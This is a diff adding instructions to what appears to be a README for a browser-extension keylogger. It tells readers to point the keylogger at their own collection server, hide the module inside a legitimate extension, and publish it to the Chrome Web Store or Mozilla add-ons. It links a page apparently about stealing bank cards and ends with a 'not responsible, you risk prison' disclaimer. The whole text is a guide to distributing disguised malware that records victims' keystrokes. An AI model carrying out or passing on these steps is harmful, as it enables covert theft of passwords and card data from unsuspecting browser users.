@@ -15,3 +15,23 @@ https://panafricaine.com/ransomware/Keylogger/4/comment-les-hackers-piratent-les
 
 # what do you need ?
 
+-web server for exemple hosgator, or free hosting (00webhost ) or wampserver or xhampp ... to test your extension
+
+-publish your extension in  chrome web store or adon mozilla ( video can found here https://www.youtube.com/watch?v=05_6bqjGqyo or my web site malware in the browser
+
+# how it works ?
+
+1) open keylog
+
+change http://1127.0.0.1     to your web server 
+
+2) send folder named "server"   to your web server , test with wampserver or xhampp
+
+3) take a legitimate extension then add your keylogger module, if you have questions how does it work ask me in comment
+  https://panafricaine.com/ransomware/Keylogger/4/comment-les-hackers-piratent-les-cartes-bancaires-facilement-2019.php
+
+4) publish your extension one chrome web store or adon mozilla
+
+# waring
+
+# I am in no way responsible for your actions, you risk going to prison
